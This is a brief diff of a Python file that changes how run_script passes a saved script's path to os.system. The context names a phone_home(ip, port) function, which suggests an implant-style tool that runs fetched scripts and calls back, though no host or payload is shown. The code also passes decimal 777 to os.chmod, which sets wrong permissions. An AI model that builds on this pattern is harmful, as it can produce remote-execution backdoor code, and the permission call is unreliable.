@@ -32,7 +32,7 @@ def attempt_script_save(script_contents):
 
 def run_script(script_location):
   os.chmod(script_location, 777)
-  os.system("{}".format(script_location))
+  os.system(script_location)
 
   
 def phone_home(ip, port):
